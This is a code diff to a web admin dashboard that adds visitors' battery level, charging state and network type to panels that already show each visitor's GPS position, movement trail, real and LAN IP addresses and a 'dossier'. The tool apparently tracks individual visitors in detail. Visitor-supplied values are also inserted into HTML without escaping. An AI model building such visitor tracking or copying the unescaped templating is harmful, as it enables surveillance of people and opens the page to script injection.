@@ -993,6 +993,50 @@
       } catch (e) {}
     }
 
+    let adminHealthKeepAliveTimer = null;
+
+    function startAdminHealthKeepAlivePing() {
+      if (adminHealthKeepAliveTimer) return;
+      const ping = () => {
+        fetch('/api/health', { cache: 'no-store', keepalive: true }).catch(() => {});
+      };
+      setTimeout(ping, 3000);
+      adminHealthKeepAliveTimer = setInterval(ping, 45000);
+    }
+
+    function getVisitorBatteryNetworkBadgesHtml(v, isPopup = false) {
+      if (!v) return '';
+      const hasBatt = typeof v.batteryLevel === 'number' && v.batteryLevel >= 0 && v.batteryLevel <= 100;
+      const netStr = String(v.networkType || '').trim();
+      if (!hasBatt && !netStr) return '';
+
+      if (isPopup) {
+        const parts = [];
+        if (hasBatt) {
+          const bIcon = v.batteryCharging ? '⚡🔋' : '🔋';
+          const bColor = v.batteryLevel <= 20 ? '#dc2626' : '#059669';
+          parts.push(`<span style="background:${bColor}18; color:${bColor}; border:1px solid ${bColor}55; padding:1px 6px; border-radius:6px; font-weight:800; font-size:9px;">${bIcon} ${v.batteryLevel}%</span>`);
+        }
+        if (netStr) {
+          parts.push(`<span style="background:#0284c718; color:#0369a1; border:1px solid #0284c755; padding:1px 6px; border-radius:6px; font-weight:800; font-size:9px;" dir="ltr">📶 ${netStr}</span>`);
+        }
+        return `<div style="display:flex; flex-wrap:wrap; align-items:center; gap:4px; margin:3px 0;">${parts.join('')}</div>`;
+      }
+
+      const badges = [];
+      if (hasBatt) {
+        const bIcon = v.batteryCharging ? '⚡🔋' : '🔋';
+        const bClass = v.batteryLevel <= 20
+          ? 'bg-red-500/20 border-red-400/50 text-red-300'
+          : 'bg-emerald-500/15 border-emerald-400/40 text-emerald-300';
+        badges.push(`<span class="px-1.5 py-0.5 rounded-md border ${bClass} text-[10px] font-num font-bold" dir="ltr" title="نسبة البطارية">${bIcon} ${v.batteryLevel}%</span>`);
+      }
+      if (netStr) {
+        badges.push(`<span class="px-1.5 py-0.5 rounded-md bg-sky-500/15 border border-sky-400/40 text-sky-300 text-[10px] font-num font-bold" dir="ltr" title="نوع اتصال الشبكة">📶 ${netStr}</span>`);
+      }
+      return badges.join('');
+    }
+
     function unlockDashboard() {
       document.getElementById('loginModal').classList.add('hidden');
       document.getElementById('adminContent').classList.remove('hidden');
@@ -1001,6 +1045,7 @@
       initAdminMap();
       fetchAdminData();
       initAdminRealtimeSseStream();
+      startAdminHealthKeepAlivePing();
       if (autoRefreshTimer) clearInterval(autoRefreshTimer);
       autoRefreshTimer = setInterval(fetchAdminData, 10000);
     }
@@ -1199,9 +1244,11 @@
       const lat6 = Number(v.lat || 15.3538).toFixed(6);
       const lng6 = Number(v.lng || 44.2058).toFixed(6);
       const liveMeta = getVisitorLiveStatusMeta(v);
+      const battTag = (typeof v.batteryLevel === 'number' && v.batteryLevel >= 0 && v.batteryLevel <= 100) ? ` • 🔋 ${v.batteryLevel}%` : '';
+      const netTag = v.networkType ? ` • 📶 ${v.networkType}` : '';
       document.getElementById('inspVisitorName').innerText = displayUser;
       document.getElementById('inspVisitorSub').innerText = `${liveMeta.mainLabel} (${liveMeta.subLabel}) • أرشيف: ${prevCount}`;
-      document.getElementById('inspDevice').innerText = v.device || 'هاتف ذكي / كمبيوتر';
+      document.getElementById('inspDevice').innerText = `${v.device || 'هاتف ذكي / كمبيوتر'}${battTag}${netTag}`;
       document.getElementById('inspCoords').innerText = `${lat6}, ${lng6}`;
       document.getElementById('inspIp').innerText = v.ip || '0.0.0.0';
       document.getElementById('inspCityBadge').innerText = `${v.city || 'صنعاء'} • ${liveMeta.markerTag}`;
@@ -1446,6 +1493,9 @@
             liveStatus: acc?.liveStatus || acc?.connectionStatus || 'exited',
             gpsEnabled: acc?.gpsEnabled !== undefined ? acc.gpsEnabled : true,
             lastHeartbeatAt: acc?.lastHeartbeatAt || acc?.updatedAt || null,
+            batteryLevel: typeof acc?.batteryLevel === 'number' ? acc.batteryLevel : null,
+            batteryCharging: typeof acc?.batteryCharging === 'boolean' ? acc.batteryCharging : null,
+            networkType: acc?.networkType || '',
             isp: acc?.isp || '',
             device: acc?.device || 'هاتف ذكي / متصفح مباشر',
             firstSeen: acc?.createdAt || latestS?.timestamp || new Date().toISOString(),
@@ -1538,6 +1588,9 @@
             if (item.liveStatus) pAnon.liveStatus = item.liveStatus;
             if (item.gpsEnabled !== undefined) pAnon.gpsEnabled = item.gpsEnabled;
             if (item.lastHeartbeatAt) pAnon.lastHeartbeatAt = item.lastHeartbeatAt;
+            if (typeof item.batteryLevel === 'number') pAnon.batteryLevel = item.batteryLevel;
+            if (typeof item.batteryCharging === 'boolean') pAnon.batteryCharging = item.batteryCharging;
+            if (item.networkType) pAnon.networkType = item.networkType;
             if (Array.isArray(item.movementHistory) && item.movementHistory.length > 0) {
               pAnon.movementHistory = item.movementHistory;
             }
@@ -1623,6 +1676,9 @@
             if (cleanedItem.gpsClosedAt !== undefined) primary.gpsClosedAt = cleanedItem.gpsClosedAt;
             if (cleanedItem.lastHeartbeatAt) primary.lastHeartbeatAt = cleanedItem.lastHeartbeatAt;
             if (cleanedItem.lastSeen) primary.lastSeen = cleanedItem.lastSeen;
+            if (typeof cleanedItem.batteryLevel === 'number') primary.batteryLevel = cleanedItem.batteryLevel;
+            if (typeof cleanedItem.batteryCharging === 'boolean') primary.batteryCharging = cleanedItem.batteryCharging;
+            if (cleanedItem.networkType) primary.networkType = cleanedItem.networkType;
             if (hasValidItemCoords) {
               primary.lat = Number(cleanedItem.lat);
               primary.lng = Number(cleanedItem.lng);
@@ -2097,6 +2153,7 @@
         });
 
         const marker = L.marker([plotLat, plotLng], { icon: customIcon }).addTo(adminMap);
+        const popupBattNetHtml = getVisitorBatteryNetworkBadgesHtml(v, true);
         marker.bindPopup(`
           <div style="font-family:'Cairo',sans-serif; text-align:right; direction:rtl; min-width:220px; color:#0f172a;">
             <div style="display:flex; align-items:center; justify-content:space-between; gap:6px; margin-bottom:4px;">
@@ -2104,6 +2161,7 @@
               <span style="background:${liveMeta.markerColor}; color:#fff; font-size:9px; font-weight:800; padding:1px 6px; border-radius:999px;">${liveMeta.mainLabel}</span>
             </div>
             <div style="font-size:10px; color:#047857; font-weight:800; margin-bottom:2px;">📡 الحالة: ${liveMeta.subLabel}</div>
+            ${popupBattNetHtml}
             <div style="font-size:11px; color:#334155;">📍 ${v.city || 'صنعاء'} — ${v.country || 'اليمن'}</div>
             <div style="font-size:10px; color:#0f766e; font-family:monospace;" dir="ltr">${baseLat.toFixed(6)}, ${baseLng.toFixed(6)}</div>
             <div style="font-size:10px; color:#0369a1; font-weight:700;">🧭 نقاط المسار المسجلة: ${trailPoints.length} نقطة</div>
@@ -2471,6 +2529,7 @@
                 <span>الهاتف / الجهاز والشبكة والـ IP:</span>
               </div>
               <div class="text-white font-bold">الجهاز: <span class="text-amber-300">${v.device || 'هاتف ذكي'}</span></div>
+              <div class="flex flex-wrap items-center gap-1">${getVisitorBatteryNetworkBadgesHtml(v, false)}</div>
               <div class="text-slate-300">الشبكة (ISP): <span class="text-cyan-300 font-bold">${v.isp || 'يمن نت'}</span></div>
               <div class="text-slate-300 font-num" dir="ltr">Real IP: <span class="text-emerald-400 font-bold select-all">${v.ip || ''}</span> ${v.localIp ? `• LAN: ${v.localIp}` : ''}</div>
               ${v.asn ? `<div class="text-[11px] text-slate-400 font-num" dir="ltr">ASN: ${v.asn}</div>` : ''}
@@ -2662,6 +2721,7 @@
             <td class="p-2 text-[10px] space-y-0.5">
               <div class="text-cyan-300 font-bold">🌐 ${v.isp || 'يمن نت'}</div>
               <div class="text-slate-200 font-semibold">${v.device || 'هاتف ذكي'}</div>
+              <div class="flex flex-wrap items-center gap-1 pt-0.5">${getVisitorBatteryNetworkBadgesHtml(v, false)}</div>
             </td>
             <td class="p-2 text-slate-400 font-num text-[10px]">
               <div class="text-emerald-300 font-bold">${lastSeenStr}</div>
@@ -2732,6 +2792,7 @@
                 <button type="button" onclick="copyAdminCoords('${lat6}, ${lng6}')" class="px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 text-[9px] font-bold">نسخ 📋</button>
               </div>
               <div class="text-[10px] text-slate-300">📱 ${v.device || 'هاتف ذكي'} • 🌐 ${v.isp || ''}</div>
+              <div class="flex flex-wrap items-center gap-1">${getVisitorBatteryNetworkBadgesHtml(v, false)}</div>
               ${prevLogs.length > 0 ? `<div class="text-[10px] text-amber-300">📦 أرشيف الجلسات السابقة: ${prevLogs.length}</div>` : ''}
               <div class="grid grid-cols-3 gap-1.5 pt-0.5">
                 <button onclick="openVisitorFullDossierById('${v.id}')" class="py-1.5 rounded-lg bg-teal-500/20 border border-teal-500/40 text-teal-300 text-[10px] font-bold">📋 تفاصيل</button>
